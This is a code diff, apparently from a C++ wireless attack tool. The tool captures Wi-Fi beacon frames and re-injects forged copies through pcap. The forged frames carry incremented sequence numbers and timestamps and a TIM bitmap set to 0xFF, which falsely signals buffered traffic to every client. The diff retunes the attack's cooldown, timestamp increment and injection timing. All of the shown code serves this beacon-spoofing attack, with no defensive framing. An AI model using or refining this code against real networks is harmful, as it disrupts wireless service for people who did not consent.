@@ -105,7 +105,7 @@ int main(int argc, char* argv[]) {
 					Clock last = it->second;
 					Diff diff = now - last;
 					//GTRACE("diff=%lu\n", diff.count());
-					if (diff.count() < 3000000000) // 3 sec
+					if (diff.count() < 5000000000) // 5 sec
 						attack = false;
 				}
 				if (attack) {
@@ -114,8 +114,8 @@ int main(int argc, char* argv[]) {
 					le16_t seq = beaconHdr->seq_;
 					le64_t timestamp = beaconHdr->fixed_.timestamp_;
 					beaconHdr->seq_ = seq + 1;
-					static __useconds_t timstampIncment = 100000; // 100 msec
-					beaconHdr->fixed_.timestamp_ = timestamp + le64_t(timstampIncment); // gilgil temp
+					__useconds_t timstampIncment = beaconHdr->fixed_.beaconInterval_ * 1024;
+					beaconHdr->fixed_.timestamp_ = timestamp + le64_t(timstampIncment);
 					tim->bitmap_ = 0xFF;
 
 					char sendBuf[65536];
@@ -130,7 +130,7 @@ int main(int argc, char* argv[]) {
 					memcpy(sendBeaconHdr, beaconHdr, copyLen);
 					uint32_t writeLen = sizeof(RadiotapHdr) + copyLen;
 
-					usleep(timstampIncment - 10000); // -10 msec
+					usleep(timstampIncment - 5000); // -5 msec
 					for (int i = 0; i < 10; i++) {
 						sendBeaconHdr->fixed_.timestamp_ += 1000; // +1 msec
 						int res = pcap_sendpacket(handle, (const u_char*)sendBuf, writeLen);
